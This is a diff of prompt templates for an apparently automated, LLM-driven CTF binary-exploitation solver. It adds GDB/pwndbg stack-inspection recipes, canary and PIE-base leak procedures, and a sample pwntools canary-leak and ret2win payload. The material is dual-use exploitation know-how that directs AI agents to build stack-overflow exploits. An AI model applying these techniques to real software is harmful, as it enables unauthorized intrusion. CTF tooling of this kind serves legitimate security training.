@@ -514,60 +514,136 @@ Debug the binary with GDB to understand runtime behavior. **CRITICAL** for explo
 | `heap` | Show heap state | `heap` (pwndbg) |
 | `bins` | Show free bins | `bins` (pwndbg) |
 
-### Finding Buffer Overflow Offset
+### ★ Stack Layout Inspection — Canary + PIE Base Discovery
+
+**Use this when: canary OR PIE enabled. MUST examine runtime stack, NOT static disassembly.**
+
+`info functions` / `disassemble` only give static offsets (from address 0). They do NOT give:
+- Canary value or position
+- Runtime binary base address
+- Actual return address on stack
+
+**Correct approach — break inside vuln function, inspect stack at return:**
 ```json
-// Step 1: Run with pattern input (use pwntools cyclic externally)
 {
   "tool": "Pwndbg",
   "args": {
     "commands": [
-      "run < /tmp/pattern.txt",
-      "info registers rsp rbp"
+      "set pagination off",
+      "break vuln_function_name",
+      "run",
+      "finish",
+      "x/40gx $rsp",
+      "x/gx $rbp-0x8",
+      "x/gx $rbp+0x0",
+      "x/gx $rbp+0x8",
+      "p/x $rbp",
+      "vmmap"
+    ],
+    "timeout": 30
+  }
+}
+```
+
+**What each command reveals:**
+| Command | What it gives you |
+|---------|------------------|
+| `finish` | Executes to end of vuln function — RBP/ret addr now valid |
+| `x/40gx $rsp` | Full stack: canary, saved RBP, return address, and caller-frame pointers visible |
+| `x/gx $rbp-0x8` | **Canary** (always at RBP-8 for x64; last byte is 0x00) |
+| `x/gx $rbp+0x0` | **Saved RBP** (stack address of caller's frame) |
+| `x/gx $rbp+0x8` | **Saved RIP** — ⚠ usually a LIBC address when main() is called from __libc_start_call_main. Do NOT use this for pie_base. |
+| `p/x $rbp` | RBP runtime value → use with buf offset from decompile to get buffer address |
+| `vmmap` | **Best PIE base source**: shows text segment start = binary_base directly |
+
+**How to compute offsets from the output:**
+```
+// Decompile says: char local_3e8[1000];  → buf is at RBP-0x3e8 (1000 bytes below RBP)
+// GDB shows: $rbp = 0x7fff12340000
+// → buf_addr             = 0x7fff12340000 - 0x3e8
+// → buf_offset_to_canary = 0x3e8 - 8  = 0x3e0 (bytes from buf start to canary)
+// → buf_offset_to_ret    = 0x3e8 + 8  = 0x3f0 (bytes from buf start to return addr)
+//
+// vmmap shows: 0x555555400000 r-xp ... (text segment) → binary_base = 0x555555400000
+// ⚠ x/gx $rbp+0x8 will likely show a LIBC address (e.g. 0x7f...), NOT the binary base.
+//   Always use vmmap for binary_base. For leak-based exploits, find PIE pointers at deeper
+//   stack positions: x/40gx $rsp will show them — look for addresses matching the vmmap range.
+```
+
+**If the program needs interactive input to reach the vuln function:**
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "set pagination off",
+      "break vuln_function_name",
+      "run < <(python3 -c \"import sys; sys.stdout.buffer.write(b'minimal_input_to_reach_vuln')\")",
+      "finish",
+      "x/40gx $rsp",
+      "x/gx $rbp-0x8",
+      "x/gx $rbp+0x8",
+      "p/x $rbp",
+      "vmmap"
+    ],
+    "timeout": 30
+  }
+}
+```
+
+**⚠️ DO NOT use these for canary/PIE base discovery:**
+- ❌ `info functions` → static offsets from 0x0, NOT runtime addresses
+- ❌ `disassemble main` → source-level offsets only
+- ❌ Check RIP at crash → stack already corrupted, RIP is garbage
+
+---
+
+### Finding Overflow Offset (No Canary — Cyclic Pattern Method)
+
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "set pagination off",
+      "run < <(python3 -c \"from pwn import *; sys.stdout.buffer.write(cyclic(400))\")",
+      "info registers rip rbp rsp",
+      "x/20gx $rsp"
     ]
   }
 }
-
-// Step 2: Check crash, note the value in RBP or return address
-// Use pwntools: cyclic_find(0x6161616c) to get offset
 ```
+After crash: find the value in RIP, then `cyclic_find(VALUE)` to get exact offset.
 
-### Examining Stack After Input
+---
+
+### Examining Stack After a Specific Input
 ```json
 {
   "tool": "Pwndbg",
   "args": {
     "commands": [
-      "break *0x401189",     // After read/gets
+      "set pagination off",
+      "break *ADDRESS_JUST_AFTER_READ",
       "run < /tmp/input.txt",
-      "x/20gx $rsp",         // Examine stack
-      "x/s $rsp"             // Examine as string
-    ]
-  }
-}
-```
-
-### Checking Function Addresses (No PIE)
-```json
-{
-  "tool": "Pwndbg",
-  "args": {
-    "commands": [
-      "info functions",       // List all functions
-      "p system",            // Print system address (if linked)
-      "x/i 0x401030"         // Disassemble PLT entry
+      "x/30gx $rsp",
+      "x/gx $rbp-0x8",
+      "x/gx $rbp+0x8",
+      "p/x $rbp",
+      "vmmap"
     ]
   }
 }
 ```
 
 ### When to Use
-- To find exact buffer overflow offset
-- To verify exploit payload reaches correct locations
-- To check register/stack state at crash
-- To debug why exploit isn't working
-- To find runtime addresses (PIE, ASLR)
+- **canary+PIE**: stack layout inspection (`finish` → `x/40gx $rsp` → `vmmap`)
+- **no canary**: cyclic pattern → check crash RIP/RBP
+- **runtime libc leak**: verify GOT entry contains valid libc address
+- **failed exploit debug**: examine registers and stack at crash point
 
-**CRITICAL**: When an exploit fails, use Pwndbg to understand WHY. Do not blindly modify payloads.
+**CRITICAL**: For canary+PIE binaries, `x/40gx $rsp` after `finish` is the ONLY reliable method.
+Static analysis (Ghidra offsets) gives relative positions only. Runtime inspection gives actual addresses.
 """
 
 ONE_GADGET_GUIDANCE = """## One_gadget - Libc Execve Gadgets
@@ -962,16 +1038,17 @@ ANALYSIS_DOCUMENT_TEMPLATE = env.from_string("""## Binary Information
 **ACTION REQUIRED:** Run `Pwndbg` with stack inspection commands, then have the Parsing Agent
 extract and populate the `dynamic_verification` fields in this document.
 
-Suggested commands:
+Suggested commands (canary/PIE case):
 ```
-break read
-run < /dev/zero
-up
-info frame
-info locals
-x/8gx $rbp-0x30
-x/2gx $rbp
+set pagination off
+break vuln_function_name
+run
+finish
+x/40gx $rsp
+x/gx $rbp-0x8
+x/gx $rbp+0x8
 p/x $rbp
+vmmap
 ```
 {% endif %}
 
@@ -1172,34 +1249,83 @@ ptr->field = value;  // CRITICAL: Dangling pointer
 | 0.85 | Find leak target | GOT entry for puts/printf |
 | 0.80 | Get libc offsets | `One_gadget` or symbol parsing |
 
-**CRITICAL: ALWAYS verify offset with GDB!** Static analysis gives an estimate, but compiler padding, alignment, and optimizations can change the actual offset. Wrong offset = failed exploit.
+**CRITICAL: ALWAYS verify offsets with GDB!** Static analysis gives estimates only. Compiler padding, alignment, and ASLR will change actual values.
 
-**Offset Verification with GDB (REQUIRED):**
+**Choose the right verification method based on protections:**
+
+#### Case A: Canary + PIE enabled → Stack Layout Inspection (REQUIRED)
+**DO NOT use cyclic pattern for canary+PIE. Cyclic crashes before you can read canary/ret addr.**
+Break at the function entry and examine the stack immediately (canary is set in the prologue BEFORE the breakpoint fires):
+
 ```json
 {
   "tool": "Pwndbg",
   "args": {
     "commands": [
+      "set pagination off",
+      "break ACTUAL_FUNC_NAME_FROM_SYMBOLS",
+      "run",
+      "x/40gx $rsp",
+      "x/gx $rbp-0x8",
+      "x/gx $rbp+0x8",
+      "p/x $rbp",
+      "vmmap"
+    ],
+    "timeout": 30
+  }
+}
+```
+**⚠ Replace `ACTUAL_FUNC_NAME_FROM_SYMBOLS` with the real function name from `function_symbols` in the Analysis Document (e.g. `main`, `initialize`, NOT `vuln`/`vulnerable`).**
+**⚠ Do NOT add `finish` — binary's stdin is /dev/null in batch mode, so any `read()` in the function returns 0 immediately and the function exits before stack commands run.**
+
+From the output:
+- `x/gx $rbp-0x8` → **canary value** (8 bytes, last byte always `\x00`)
+- `x/gx $rbp+0x8` → **return address** → subtract known func offset → **PIE base**
+- `vmmap` → **binary base** directly (text segment start)
+- `p/x $rbp` → RBP value → with buf offset from decompile → **buf_offset_to_canary** = (RBP - buf_addr) - 8
+
+Store in analysis: `dynamic_verification: {buf_offset_to_canary: N, buf_offset_to_ret: M, binary_base: "0x...", verified: true}`
+
+#### Case B: No canary, no PIE → Cyclic Pattern (standard)
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "set pagination off",
       "run < <(python3 -c \"from pwn import *; sys.stdout.buffer.write(cyclic(300))\")",
       "info registers rip rbp rsp",
-      "x/20gx $rsp",
-      "p/d (char*)$rip - (char*)0"
+      "x/20gx $rsp"
     ]
   }
 }
 ```
-Then use `cyclic_find(0xXXXXXXXX)` with the value in RIP to get exact offset.
+Then: `cyclic_find(VALUE_IN_RIP)` = offset to return address.
+
+#### Case C: No canary, PIE enabled → Stack Inspection for PIE base
+```json
+{
+  "tool": "Pwndbg",
+  "args": {
+    "commands": [
+      "set pagination off",
+      "break ACTUAL_FUNC_NAME_FROM_SYMBOLS",
+      "run",
+      "x/gx $rbp+0x8",
+      "vmmap"
+    ],
+    "timeout": 30
+  }
+}
+```
+**⚠ Replace `ACTUAL_FUNC_NAME_FROM_SYMBOLS` with the real function name from `function_symbols` in the Analysis Document.**
+**⚠ Do NOT add `finish` — examine stack RIGHT at breakpoint.**
+`vmmap` text segment start = binary base. `x/gx $rbp+0x8` = return addr (verify).
 
 **If exploit previously failed with wrong offset:**
-- Re-run Pwndbg with cyclic to confirm actual offset
-- Check if binary has interactive menu — must send correct menu selections BEFORE overflow
-- Verify using `Pwndbg: b *vuln_function+N; run; x/gx $rsp` at the exact return point
-
-**Static Estimate (for reference only):**
-```
-char buf[64] at RBP-0x40
-Offset to RIP = 64 (buffer) + 8 (saved RBP) = 72 bytes
-```
+- Re-run with stack inspection (Case A) to confirm actual canary/ret offsets
+- Check if binary has interactive prompts — must send correct input BEFORE overflow input
+- Verify at exact return instruction: use `break ACTUAL_FUNC_NAME_FROM_SYMBOLS` then examine immediately
 
 #### For Format String:
 | Priority | Task | Tool |
@@ -1308,7 +1434,7 @@ Use `Store.knowledge.get_heap_techniques(version)` for version-specific techniqu
   "tool": "Pwndbg",
   "args": {
     "commands": [
-      "break *vulnerable_func",
+      "break ACTUAL_FUNC_NAME_FROM_SYMBOLS",
       "run",
       "info registers",
       "x/20gx $rsp",
@@ -1318,6 +1444,7 @@ Use `Store.knowledge.get_heap_techniques(version)` for version-specific techniqu
   }
 }
 ```
+**⚠ Replace `ACTUAL_FUNC_NAME_FROM_SYMBOLS` with the real function name from `function_symbols` in the Analysis Document. NEVER use placeholder names like `vuln`, `vulnerable`, `buf_overflow`.**
 
 ---
 
@@ -1361,6 +1488,25 @@ Use `Store.knowledge.get_heap_techniques(version)` for version-specific techniqu
 - **0.7-0.8**: Supporting tasks for current phase
 - **0.5-0.6**: Next phase prep
 - **0.3-0.4**: Optional/backup approaches
+
+---
+
+## ⛔ ABSOLUTE NO-GUESSING RULES
+
+These apply to ALL tasks you create. Creating a task that requires guessing will cause exploit failure.
+
+| Category | FORBIDDEN (guessing) | CORRECT (use verified data) |
+|----------|---------------------|----------------------------|
+| **Function names in GDB** | `break vuln`, `break vulnerable`, `break buf_overflow` | Only names from `function_symbols` in Analysis Document (e.g. `break main`) |
+| **Buffer sizes** | `buf_offset = 40`, `padding = b'A'*64` without GDB confirmation | `buf_offset_to_canary` / `buf_offset_to_ret` from `dynamic_verification` |
+| **I/O prompt strings** | `recvuntil(b"Enter: ")`, `recvuntil(b"> ")` without seeing them in code | Exact strings from decompiled code / source code |
+| **Win function address** | Hardcoded `0x401156` without checking symbols | `win_function_addr` from `analysis.win_function_addr` |
+| **Libc offsets** | `system_offset = 0x52290` without computing from the provided libc | Run `one_gadget` / read symbols from the actual libc file |
+| **Canary position** | Assume canary is at `buf+64` | Verify with `x/gx $rbp-0x8` in GDB |
+| **PIE base** | Hardcode `0x555555554000` | Read from `vmmap` or `binary_base` in `dynamic_verification` |
+
+**Before creating any GDB task**, check `function_symbols` in the Analysis Document for actual function names.
+**Before creating any exploit task**, verify all offsets via GDB — static analysis estimates are STARTING POINTS, not final values.
 
 {{ tool_descriptions }}
 """)
@@ -1410,6 +1556,12 @@ INSTRUCTION_SYSTEM = env.from_string("""You are the **Instruction Agent** for a 
 - Don't select tasks whose dependencies aren't met
 - Avoid duplicate tool calls (check execution history)
 - Group related tasks together when possible
+
+## CRITICAL: GDB / Pwndbg Function Names
+- **NEVER guess function names** (e.g. `vuln`, `vulnerable`, `buf_overflow`).
+- Use **only** function names listed in `Function Symbols` from the Analysis Summary.
+- If you need to break at the vulnerable function, use the actual name (e.g. `break main`) or its address (e.g. `break *0x128a`).
+- If no symbol list is available yet, use `info functions` first to discover real names.
 
 {{ tool_descriptions }}
 """)
@@ -1476,6 +1628,14 @@ PARSING_SYSTEM = env.from_string("""You are the **Parsing Agent** for a pwnable 
       "buffer_to_rbp": 64,
       "buffer_to_rip": 72,
       "verified": false
+    },
+    "dynamic_verification": {
+      "verified": true,
+      "buf_offset_to_canary": 56,
+      "buf_offset_to_ret": 72,
+      "binary_base": "0x555555400000",
+      "rbp_value": "0x7fffffffe448",
+      "raw_gdb_output": "..."
     }
   },
   "key_findings": ["..."],
@@ -1663,11 +1823,67 @@ If the overflow mechanism has restrictions, record them in the vulnerability ent
 - Multi-stage input (menu, length then data): record each step's constraints
 - read() with explicit size: `read(0, buf, N)` → record `"input N bytes max"`
 
+---
+
+## CRITICAL: Extract dynamic_verification from Pwndbg Output
+
+When parsing Pwndbg/GDB output that includes stack inspection (`x/40gx $rsp`, `p/x $rbp`, `vmmap`), extract and store **all** of the following into `dynamic_verification`:
+
+```json
+{
+  "analysis_updates": {
+    "dynamic_verification": {
+      "verified": true,
+      "buf_offset_to_canary": 992,
+      "buf_offset_to_saved_rbp": 1000,
+      "buf_offset_to_ret": 1008,
+      "canary_offset_from_rbp": -8,
+      "binary_base": "0x555555400000",
+      "rbp_value": "0x7fffffffe3e8",
+      "stack_base": "0x7fffffffe000",
+      "local_vars": [
+        {"name": "local_3e8", "size": 1000, "offset_from_rbp": -1000}
+      ],
+      "raw_gdb_output": "<first 500 chars of gdb output>"
+    }
+  }
+}
+```
+
+**How to extract each field from GDB output:**
+
+| Field | How to find it |
+|-------|---------------|
+| `buf_offset_to_canary` | From decompile: buf at RBP-N → `buf_offset_to_canary = N - 8` (canary is always at RBP-8) |
+| `buf_offset_to_ret` | `N + 8` (canary at N-8, saved_rbp at N, ret at N+8) |
+| `binary_base` | From `vmmap` output: first address of text/executable segment (usually `0x555555...`) |
+| `rbp_value` | From `p/x $rbp` output |
+| `canary_offset_from_rbp` | Always -8 for x64 with stack canary |
+
+**Identifying the canary in `x/40gx $rsp` output:**
+- Canary is an 8-byte value where the **last byte (lowest address) is always 0x00**
+- Example: `0x12345678abcdef00` ← this is the canary (ends in 00)
+- It appears just before the saved RBP and return address in the stack dump
+
+**Identifying binary_base:**
+- ⚠ IMPORTANT: The saved return address at [rbp+8] is usually a LIBC address (from
+  __libc_start_call_main), NOT a binary (PIE) address. Do NOT compute binary_base from it.
+- Use `vmmap` output directly: look for the r-xp segment (text segment) of the binary file.
+  Example: `0x555555400000-0x555555401000 r-xp ... /path/to/binary` → base = `0x555555400000`
+- Cross-check by looking at `x/40gx $rsp` for addresses in the binary's vmmap range (0x55...).
+  These appear at deeper stack positions (past saved RIP) — they are binary addresses stored by
+  the libc startup code (e.g., the address of main passed to __libc_start_main).
+
+**IMPORTANT: Always set `verified: true` when you successfully extract these values.**
+
+---
+
 ## Parsing Guidelines
 - Extract concrete values (addresses, sizes, offsets)
 - **ALWAYS calculate estimated offset when buffer size is known**
 - **ALWAYS extract I/O patterns** (prompts + input methods) from decompiled code
 - **ALWAYS record exploit_constraints** when you see input size limits or non-standard overflow mechanisms
+- **ALWAYS extract dynamic_verification** when Pwndbg output contains stack/register/vmmap data
 - Note protection status and exploitation implications
 - Keep code snippets concise but complete
 """)
@@ -2617,6 +2833,17 @@ def build_analysis_summary(state: SolverState) -> str:
     if libc.get("detected"):
         lines.append(f"**Libc:** {libc.get('path', 'detected')}")
 
+    # Function symbols — CRITICAL: list actual function names so LLM doesn't guess wrong ones
+    function_symbols = state.get("facts", {}).get("function_symbols", {})
+    if function_symbols:
+        fn_list = ", ".join(f"{name}@{addr}" for name, addr in function_symbols.items())
+        lines.append(f"**Function Symbols (use ONLY these names in GDB breakpoints):** {fn_list}")
+        # Highlight win/special functions
+        win_name = analysis.get("win_function_name", "")
+        win_addr = analysis.get("win_function_addr", "")
+        if win_name and win_addr:
+            lines.append(f"**Win Function:** {win_name} @ {win_addr}")
+
     return "\n".join(lines) if lines else "(No analysis yet)"
 
 
@@ -2919,10 +3146,35 @@ runnable Python script** that includes all previous verified stages plus the new
 - **Description:** {{ current_stage.description }}
 - **Verification Marker:** `{{ current_stage.verification_marker }}`
 
-{% if verified_stages %}
-## Previously Verified Code (INCLUDE THIS IN YOUR SCRIPT)
-The following stages have been tested and work correctly.
-Your script MUST include equivalent logic before adding Stage {{ current_stage.stage_index + 1 }}.
+{% if additions_only and verified_stages %}
+## ADDITIONS-ONLY MODE — Stage {{ current_stage.stage_index + 1 }}
+
+**The verified Stage 1 code below will be AUTOMATICALLY PREPENDED to your output.**
+**Do NOT reproduce any previous stage code in your `exploit_code` field.**
+
+The following code is already executed and its variables are in scope:
+```python
+{{ base_code_snippet }}
+```
+
+**Variables already defined — do NOT re-declare or re-initialize:**
+- `p` — the active process/remote connection (DO NOT create a new one)
+- `elf` — ELF binary object
+- Any other variables set above (e.g. `canary`, `pie_base`, etc.)
+
+**Your `exploit_code` must contain ONLY the Stage {{ current_stage.stage_index + 1 }} additions:**
+- NO `from pwn import *`
+- NO `context.binary = ...`
+- NO `p = process(...)` / `p = remote(...)`
+- NO re-implementation of Stage 1 leak logic
+- Start directly with the first NEW action for Stage {{ current_stage.stage_index + 1 }}
+
+{% elif verified_stages %}
+## Previously Verified Code (COPY VERBATIM — DO NOT REWRITE)
+The following stages have been tested and verified working.
+**CRITICAL: Copy the verified code EXACTLY as-is. Do NOT refactor, rewrite, or re-implement it.**
+Even minor changes (different slice indices, different recvuntil strings, different variable names) can break the leak logic.
+Only add Stage {{ current_stage.stage_index + 1 }} logic AFTER the verified code block.
 
 {% for vs in verified_stages %}
 ### Stage {{ loop.index }}: {{ vs.stage_id }} (VERIFIED ✓)
@@ -2936,14 +3188,71 @@ Your script MUST include equivalent logic before adding Stage {{ current_stage.s
 {% endfor %}
 {% endif %}
 
+## Using Dynamic Verification Values (MANDATORY when available)
+
+The Analysis Document contains a **"Dynamic Verification (Pwndbg/GDB)"** section with
+runtime-verified offsets extracted by GDB. **If `verified: true`, use these values DIRECTLY
+— do NOT recompute or estimate them:**
+
+| Field | How to use in exploit |
+|-------|-----------------------|
+| `buf_offset_to_canary` | `padding = b'A' * buf_offset_to_canary` before canary |
+| `buf_offset_to_ret` | `padding = b'A' * buf_offset_to_ret` before return address (no canary case) |
+| `binary_base` | PIE base → `win_addr = int(binary_base, 16) + win_function_offset` |
+| `rbp_value` | RBP at runtime → verify your offset: `canary_addr = rbp - 8` |
+
+**Example for canary + PIE exploit using verified values:**
+```python
+# From dynamic_verification (use EXACT values from Analysis Document):
+buf_offset_to_canary = <dv.buf_offset_to_canary>   # e.g. 984
+buf_offset_to_ret    = <dv.buf_offset_to_ret>       # e.g. 1000
+binary_base          = <dv.binary_base>              # e.g. "0x555555554000"
+win_offset           = <win_function_addr_from_symbols>  # e.g. 0x1234 (static offset)
+
+# Stage 1 payload (leak canary):
+p.send(b'A' * (buf_offset_to_canary + 1))  # +1 to overwrite canary's 0x00 byte
+canary_raw = p.recvuntil(b'<next_prompt>')[buf_offset_to_canary:][:8]
+canary = u64(canary_raw.ljust(8, b'\\x00')) & ~0xff  # clear last byte
+
+# Stage 2 payload (overflow with canary + ret2win):
+win_addr = int(binary_base, 16) + win_offset
+payload = b'A' * buf_offset_to_canary
+payload += p64(canary)          # exact canary (8 bytes)
+payload += p64(0)               # saved RBP (8 bytes)
+payload += p64(win_addr)        # return address
+p.send(payload)
+```
+
+**If `verified: false` or section says "NOT YET DONE":** use static estimates from decompile only
+as a starting point — but request dynamic verification via Pwndbg before finalizing.
+
+---
+
 ## CRITICAL Rules
 
+{% if additions_only %}
+1. **Stage additions only**: Verified Stage 1 code is prepended automatically. Do NOT include imports, process setup, or Stage 1 logic. Start with Stage {{ current_stage.stage_index + 1 }} actions directly.
+2. **Reuse the existing `p` connection** — never close and reopen. ASLR means you cannot re-do Stage 1 in a new process.
+3. **context.log_level** is already set. Do NOT re-set it.
+{% else %}
 1. **COMPLETE script**: `from pwn import *` through `p.close()`. No missing imports.
 2. **Include ALL previous stages**: ASLR means addresses change each run → must re-do leak every time.
 3. **context.log_level = 'debug'**: MANDATORY — must appear right after `from pwn import *` at the top of every exploit script. Enables I/O tracing for debugging.
-4. **EXACT I/O strings**: Use strings from the decompiled code, never guess.
+{% endif %}
+4. **EXACT I/O strings**: Use strings from the decompiled code or source code, NEVER guess. `recvuntil(b"Enter: ")` when the binary doesn't print "Enter: " will hang forever.
 5. **Prefer one_gadget** over system for hook overwrites (simpler).
 6. **NEVER use p.interactive()**: Hangs the subprocess.
+
+## ⛔ NO-GUESSING RULES (exploit will timeout/crash if violated)
+
+| Category | WRONG (guessing) | CORRECT |
+|----------|-----------------|---------|
+| **I/O prompt strings** | `recvuntil(b"Enter: ")` | Use exact string from source/decompile (e.g. `b"Pattern: "`) |
+| **Buffer offset** | `padding = b'A' * 40` (assumed) | Use `buf_offset_to_canary` / `buf_offset_to_ret` from Analysis Document |
+| **Win function address** | `win = elf.sym['win']` only if 'win' actually exists | Check `win_function_name` from Analysis Document |
+| **PIE base** | `pie_base = 0x555555554000` hardcoded | Compute from runtime leak or use `binary_base` from dynamic_verification |
+| **Canary position** | `canary = u64(p.recvn(7).ljust(8, b'\\x00'))` without I/O sync | `recvuntil(next_prompt)` then slice at `buf_offset_to_canary` |
+| **`recvuntil` after `read()`** | `p.recvuntil(b"length.\\r\\n")` when prompt is `"Target length: "` (no newline) | Use `sendlineafter(b"Target length: ", ...)` — `read()` prompt has NO newline |
 
 ## Connection Pattern (MANDATORY)
 {% if docker_port %}
@@ -2995,6 +3304,151 @@ Replace `<placeholders>` with EXACT strings from the decompiled code (e.g., `b"4
 - `p.send(b"1 " + str(size).encode() + b" " + content)` — WRONG. Each input needs separate send.
 - `p.sendline(content)` for `read()` — WRONG. `read()` does not need newline, use `p.send()`.
 - Forgetting to receive the prompt before sending — causes desynchronization.
+
+## REPEAT-LOOP Programs: Pattern + Target Length Protocol
+
+For binaries that repeatedly ask for a pattern and target_len (e.g., a repeat/echo service with a memcpy loop):
+
+### ⚠ scanf leaves `\n` in stdin — affects NEXT read()
+
+After `scanf("%d")` reads target_len, a `\n` character is LEFT IN STDIN.
+The NEXT `read()` call consumes this `\n` as its FIRST BYTE, making:
+- **Effective pattern_len = bytes_you_sent + 1** (for iterations 2, 3, 4, ...)
+
+```python
+# Iteration 1 (first ever — no previous scanf \n):
+p.sendafter(b"Pattern: ", b"A" * 10)      # read() gets exactly 10 bytes → pattern_len = 10
+p.sendlineafter(b"Target length: ", b"1000")  # scanf reads 1000, leaves \n
+
+# Iteration 2 (has leftover \n from previous scanf):
+# If you sendafter() — pwntools sends AFTER "Pattern: ", so \n + your_bytes arrive together
+p.sendafter(b"Pattern: ", b"B" * 10)      # read() gets \n + "BBBBBBBBBB" = 11 bytes → pattern_len = 11!
+# To get pattern_len=10 in iteration 2, send only 9 bytes:
+p.sendafter(b"Pattern: ", b"B" * 9)       # read() gets \n + "BBBBBBBBB" = 10 bytes → pattern_len = 10 ✓
+```
+
+**ALWAYS use `sendafter(b"Pattern: ", ...)` (NOT `send()`) so pwntools waits for the prompt
+before sending, which prevents premature flushing.**
+
+### ⚠ Precise byte count: To expose buf[X] without destroying it
+
+The memcpy loop runs: `for count in range(0, target_len, pattern_len): memcpy(buf+count, pattern, pattern_len)`
+Total bytes written = `last_count + pattern_len` where `last_count = floor((target_len-1)/pattern_len) * pattern_len`
+
+**REQUIRED FORMULA: `floor((target_len-1) / pattern_len) * pattern_len + pattern_len == X`**
+
+To read data at buf[X] via puts(), write EXACTLY X bytes (buf[0..X-1]) — leaving buf[X] intact.
+
+| Goal | pattern_len (effective) | Calc | Total written |
+|------|------------------------|------|---------------|
+| Overwrite canary null byte at buf[1001] | 11 | floor(999/11)×11=990, last: buf[990..1000] | **1001** ✓ |
+| Expose PIE at buf[1032] | 43 | floor(999/43)×43=989, last: buf[989..1031] | **1032** ✓ |
+| ❌ WRONG for buf[1032] | 80 | floor(999/80)×80=960, last: buf[960..1039] | **1040** — buf[1032] DESTROYED! |
+
+```python
+# Verify before coding:
+pattern_len_eff = 43  # effective (include \n from scanf if iteration >= 2)
+target_len = 1000
+target_offset = 1032  # want to expose buf[1032]
+last_count = (target_len - 1) // pattern_len_eff * pattern_len_eff
+total_written = last_count + pattern_len_eff
+assert total_written == target_offset, f"WRONG: writes {total_written} bytes, need {target_offset}"
+```
+
+**REMEMBER**: In iteration 2+, effective pattern_len = sent_bytes + 1 (because of scanf \n).
+So to get effective=43, send 42 bytes. To get effective=11, send 10 bytes.
+
+## Canary + PIE Leak: MANDATORY Validation Rules
+
+When leaking a stack canary and/or PIE base from stack overflow output (`printf("%s", buf)` etc.):
+
+**1. I/O sync BEFORE extracting bytes (most common mistake):**
+```python
+# WRONG — reads from wherever the stream is, may grab prompt text instead of canary:
+canary_raw = p.recvn(7)
+
+# CORRECT — consume output up to the NEXT prompt, then slice bytes at correct offset:
+response = p.recvuntil(b"<next_prompt>")
+canary_bytes = response[buf_offset_to_canary : buf_offset_to_canary + 8]
+canary = u64(canary_bytes.ljust(8, b'\x00')) & ~0xff
+```
+
+**2. Validate canary after extraction — ALWAYS print `STAGE_FAILED` if invalid:**
+```python
+canary = u64(canary_bytes.ljust(8, b'\x00')) & ~0xff
+# Canary first byte is ALWAYS \x00 (& ~0xff clears it back); remaining 7 bytes are random
+if canary == 0:
+    print(f"STAGE_FAILED canary=0x{canary:016x} (zero — extraction failed)")
+    p.close(); exit()
+# Detect I/O desync: real canary bytes are mostly non-printable
+raw = canary.to_bytes(8, 'little')
+printable = sum(1 for b in raw if 0x20 <= b <= 0x7e or b == 0x0a)
+if printable >= 7:
+    print(f"STAGE_FAILED canary=0x{canary:016x} (looks like ASCII text — I/O desync!)")
+    p.close(); exit()
+```
+
+**3. PIE base MUST be computed dynamically — NEVER hardcode:**
+```python
+# WRONG — 0x555555554000 is ASLR-off debug base, wrong in real run:
+pie_base = 0x555555554000
+
+# CORRECT — compute from a leaked binary address (e.g. saved return address):
+leaked_ret = u64(ret_bytes.ljust(8, b'\x00'))
+
+# CRITICAL: Validate RAW bytes BEFORE masking/subtracting offset.
+# If raw bytes look like printable ASCII text, the I/O is desynced
+# (printf stopped at a null byte before reaching the return address,
+# and you're reading prompt text like 'Pattern: ' instead).
+raw_ret_bytes = leaked_ret.to_bytes(8, 'little') if leaked_ret < 2**64 else b'\x00'*8
+raw_printable = sum(1 for b in raw_ret_bytes if 0x20 <= b <= 0x7e)
+if raw_printable >= 6:
+    print(f"STAGE_FAILED raw_ret=0x{leaked_ret:x} (bytes look like ASCII text: {list(raw_ret_bytes[:6])} — reading prompt string, not return address!)")
+    p.close(); exit()
+
+pie_base = leaked_ret - <static_offset_of_ret_from_binary_base>
+assert pie_base & 0xfff == 0, f"pie_base not page-aligned: 0x{pie_base:x}"
+if pie_base < 0x100000 or pie_base > 0x7fffffffffff:
+    print(f"STAGE_FAILED pie_base=0x{pie_base:x} (invalid)")
+    p.close(); exit()
+```
+
+**CRITICAL (printf leak limitation)**: `printf("%s", buf)` stops at the FIRST null byte encountered.
+If the data after the buffer contains null bytes (e.g., in saved RBP bytes 6-7, or in the canary),
+**printf will stop before reaching the return address**. In that case, only canary + partial RBP are
+leaked; the return address is NEVER in the output. The "leaked return address" would actually be the
+next prompt string ("Pattern: " etc.) — confirmed when raw bytes are all printable ASCII.
+
+**ALSO CRITICAL — saved RIP is usually a LIBC address, not PIE:**
+main() is called from `__libc_start_call_main` (a libc function). So [rbp+8] = saved RIP contains
+a libc address, NOT a binary (PIE) address. Computing `pie_base = saved_RIP & ~0xfff` gives the
+libc base, not the binary base. To find a real PIE-range address on the stack:
+  1. Use pwndbg: `x/40gx $rsp` and `vmmap` to see all mapped regions. Find stack words that fall
+     inside the binary's mapped range (the PIE region shown in vmmap, typically 0x55... or 0x56...).
+  2. Those PIE-range pointers typically appear at stack positions past saved RIP (in the caller's
+     frame — e.g., the address of main() that __libc_start_call_main passes before calling main).
+  3. Compute: `pie_base = leaked_binary_addr - <static offset of that symbol>` (check symbols with nm).
+
+**Solution when printf stops at RBP null bytes (aggressive overwrite technique):**
+If a single small overflow can only expose the canary (puts stops at null bytes in saved RBP before
+reaching saved RIP), use a SEPARATE overflow that fills canary + saved_RBP + saved_RIP all with
+non-null bytes. This removes every null byte barrier so puts() reads deeper into the stack, where a
+PIE-range pointer (placed there by libc startup code) can be found.
+  • Use pwndbg to confirm which exact stack offset holds a binary-range address.
+  • `pie_base = leaked_binary_addr - known_static_offset`; assert `pie_base & 0xfff == 0`.
+
+**For LOOP-BASED programs (binary re-prompts in a loop):**
+When the binary repeatedly asks for input (pattern + length) in a loop:
+  • Each loop iteration = one overflow + one puts() output. Use separate iterations for each leak.
+  • After planting the exploit payload in one iteration (within the normal length limit so the loop
+    continues), trigger program exit by sending a value that exceeds the allowed maximum.
+    The length-exceeded check typically fires BEFORE memcpy, so the payload is NOT overwritten.
+    When main() finally returns, the canary check passes and the planted payload executes.
+
+**4. Canary/PIE marker format (Stage Verify expects these field names):**
+```python
+print(f"<MARKER> canary=0x{canary:016x} pie_leak=0x{pie_base:x}")
+```
 7. **End with verification:**
 {% if current_stage.verification_marker == "SHELL_VERIFIED" %}
    After triggering shell:
@@ -3051,6 +3505,17 @@ STAGE_EXPLOIT_USER = env.from_string("""## Analysis Document
 
 {{ analysis_document }}
 
+{% if source_code_snippet %}
+## Binary Source Code (GROUND TRUTH — use this for exact I/O protocol)
